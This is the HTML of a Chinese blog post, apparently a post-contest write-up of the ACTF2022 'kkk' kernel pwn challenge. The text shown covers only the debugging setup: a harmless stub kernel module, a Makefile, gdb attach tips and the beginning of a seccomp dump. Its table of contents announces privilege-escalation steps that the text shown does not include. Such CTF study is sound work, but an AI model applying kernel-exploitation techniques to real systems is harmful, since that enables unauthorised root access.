<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>ACTF2022 kkk 赛后复现 - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="ACTF2022 kkk 赛后复现" />
<meta property="og:description" content="
        
            Info
        
        
            Yet another signin (kernel) pwn challenge. 4 Solved
        
    
感谢 Nu1L 和 AAA 的几位师傅分享思路。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://xidoo.top/2022/07/actf2022-kkk/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-17T12:03:19+08:00" />
<meta property="article:modified_time" content="2022-07-17T12:03:19+08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://xidoo.top/logo.png"/>

<meta name="twitter:title" content="ACTF2022 kkk 赛后复现"/>
<meta name="twitter:description" content="
        
            Info
        
        
            Yet another signin (kernel) pwn challenge. 4 Solved
        
    
感谢 Nu1L 和 AAA 的几位师傅分享思路。"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2022/07/actf2022-kkk/" /><link rel="prev" href="http://xidoo.top/2022/01/afl-rsc4/" /><link rel="next" href="http://xidoo.top/2023/05/rev_main/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "ACTF2022 kkk 赛后复现",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/xidoo.top\/2022\/07\/actf2022-kkk\/"
        },"genre": "posts","wordcount":  7297 ,
        "url": "http:\/\/xidoo.top\/2022\/07\/actf2022-kkk\/","datePublished": "2022-07-17T12:03:19+08:00","dateModified": "2022-07-17T12:03:19+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "x1do0"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">ACTF2022 kkk 赛后复现</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-07-17">2022-07-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;7297 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;35 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#preparation">Preparation</a></li>
    <li><a href="#step1">step1</a>
      <ul>
        <li><a href="#协议逆向">协议逆向</a>
          <ul>
            <li><a href="#packet_hdr">packet_hdr</a></li>
            <li><a href="#segment_hdr">segment_hdr</a></li>
            <li><a href="#segment">segment</a></li>
          </ul>
        </li>
        <li><a href="#demo">demo</a></li>
        <li><a href="#漏洞">漏洞</a></li>
        <li><a href="#利用">利用</a></li>
      </ul>
    </li>
    <li><a href="#step2">step2</a>
      <ul>
        <li><a href="#驱动逆向">驱动逆向</a>
          <ul>
            <li><a href="#open">open</a></li>
            <li><a href="#close">close</a></li>
            <li><a href="#0x6b64-add">0x6B64 add</a></li>
            <li><a href="#0x6b67-update">0x6B67 update</a></li>
            <li><a href="#0x6b69-dump">0x6B69 dump</a></li>
            <li><a href="#0x6b6b-launch">0x6B6B launch</a></li>
            <li><a href="#0x6b6d-detach">0x6B6D detach</a></li>
          </ul>
        </li>
        <li><a href="#加密函数">加密函数</a></li>
        <li><a href="#测试">测试</a></li>
        <li><a href="#利用-1">利用</a>
          <ul>
            <li><a href="#fork--zero-cred">fork &amp; zero <code>cred</code></a></li>
            <li><a href="#爆破内核代码段地址">爆破内核代码段地址</a></li>
            <li><a href="#泄露内核代码段地址">泄露内核代码段地址</a></li>
            <li><a href="#privilege-escalation">privilege escalation</a></li>
            <li><a href="#修改-exp">修改 exp</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#step-3">step 3</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>Info<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Yet another signin (kernel) pwn challenge. <strong>4 Solved</strong></div>
        </div>
    </div>
<p>感谢 Nu1L 和 AAA 的几位师傅分享思路。</p>
<h2 id="preparation">Preparation</h2>
<p>不知道怎么调 qemu-system 内跑的用户态程序。明明 qemu-system 不像 qemu-user 一样与 elf 公用同一片内存，但不知道为什么 parser 加载地址对不上。</p>
<blockquote>
<p>建议 host 调试,不然只能下绝对地址断点。</p>
</blockquote>
<p>尝试直接在 host 里调。kkk.ko 与本机 kernel 版本不同，不能直接挂上来。所以自己造一个 fake module</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/timer.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/workqueue.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/crypto.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/mutex.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/spinlock.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/scatterlist.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="c1">// #define DEBUG
</span><span class="c1"></span>
<span class="cm">/* ioctl commands */</span>
<span class="cp">#define KKK_IOCTL_ADD _IO(&#39;k&#39;, 100)
</span><span class="cp">#define KKK_IOCTL_UPDATE _IO(&#39;k&#39;, 103)
</span><span class="cp">#define KKK_IOCTL_DUMP _IO(&#39;k&#39;, 105)
</span><span class="cp">#define KKK_IOCTL_LAUNCH _IO(&#39;k&#39;, 107)
</span><span class="cp">#define KKK_IOCTL_DETACH _IO(&#39;k&#39;, 109)
</span><span class="cp"></span>


<span class="cm">/* empty handler, we just need ioctl */</span>
<span class="k">static</span> <span class="kt">int</span>
<span class="nf">kkk_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inodep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_open()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">kkk_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inodep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_close()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">kkk_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
                         <span class="n">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_write()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">kkk_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
                        <span class="n">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_read()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">kkk_internal_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_internal_ioctl()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_ADD</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_UPDATE</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_UPDATE</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_DUMP</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DUMP</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_LAUNCH</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_LAUNCH</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_DETACH</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DETACH</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;Wrong choice</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">kkk_unlocked_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">kkk_internal_ioctl</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">kkk_compat_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">kkk_internal_ioctl</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">kkk_fops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">kkk_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">kkk_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">kkk_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">kkk_close</span><span class="p">,</span>
    <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">kkk_unlocked_ioctl</span><span class="p">,</span>
    <span class="p">.</span><span class="n">compat_ioctl</span> <span class="o">=</span> <span class="n">kkk_compat_ioctl</span><span class="p">,</span>
    <span class="p">.</span><span class="n">llseek</span> <span class="o">=</span> <span class="n">no_llseek</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">kkk_device</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
    <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;kkk&#34;</span><span class="p">,</span>
    <span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">kkk_fops</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">kkk_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">error</span><span class="p">;</span>

    <span class="n">error</span> <span class="o">=</span> <span class="n">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kkk_device</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">pr_err</span><span class="p">(</span><span class="s">&#34;misc_register fail</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">error</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">kkk_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kkk_device</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">kkk_init</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">kkk_exit</span><span class="p">);</span>

<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;kkk fake driver&#34;</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;x1do0&#34;</span><span class="p">);</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>驱动的 Makefile 用最基础的就行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="err">ifneq</span> <span class="err">(</span><span class="k">$(</span><span class="nv">KERNELRELEASE</span><span class="k">)</span><span class="err">,)</span>
<span class="nv">obj-m</span><span class="o">:=</span>kkk.o
<span class="err">else</span>
<span class="nv">KDIR</span> <span class="o">:=</span>/lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build
<span class="nv">PWD</span> <span class="o">:=</span><span class="k">$(</span>shell <span class="nb">pwd</span><span class="k">)</span>
<span class="nf">all</span><span class="o">:</span>
	make -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
<span class="nf">clean</span><span class="o">:</span>
	rm -f *.ko *.o *.mod.o *.symvers *.cmd *.mod.c *.order
<span class="err">endif</span>
</code></pre></td></tr></table>
</div>
</div><p>make 以后 insmod 挂上来就能跑 or 调试 parser 了。</p>
<p>进 su 以后 python 环境会变，添加 sys.path 才行，不然 pwntools 库都找不到，参考<a href="https://askubuntu.com/questions/1268870/python-module-not-found-in-sudo-mode-ubuntu-20-04" target="_blank" rel="noopener noreffer">这篇</a>。</p>
<p>进 su 以后直接在脚本里 gdb.attach 会挂不上 gdb，提示 ptrace not permitted。参考<a href="https://stackoverflow.com/questions/19215177/how-to-solve-ptrace-operation-not-permitted-when-trying-to-attach-gdb-to-a-pro" target="_blank" rel="noopener noreffer">这篇</a>，尝试过改 <code>/proc/sys/kernel/yama/ptrace_scope</code> 也不行。。</p>
<p>只有先跑脚本，再开一个 su，然后 gdb attach pid 挂上去。。在 exp 中写个等待用户输入。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">###</span>
<span class="nb">input</span><span class="p">()</span> <span class="c1"># wait for input, attach gdb at this time</span>
<span class="c1">###</span>
</code></pre></td></tr></table>
</div>
</div><p>然后乘机跑 <code>debug.sh [pid]</code>，挂上 gdb。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
gdb -q attach <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> -ex <span class="s1">&#39;b *0x401B22&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>然后就能调了。。实际上 parser 还开了 sandbox，在 <code>prepare</code> 中。如果可以顺利跑起来的话直接 <code>seccomp dump</code> 也能发现。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> line  CODE  JT   JF      <span class="nv">K</span>
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
 0001: 0x15 0x00 0x0d 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0015</span>
 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto <span class="m">0005</span>
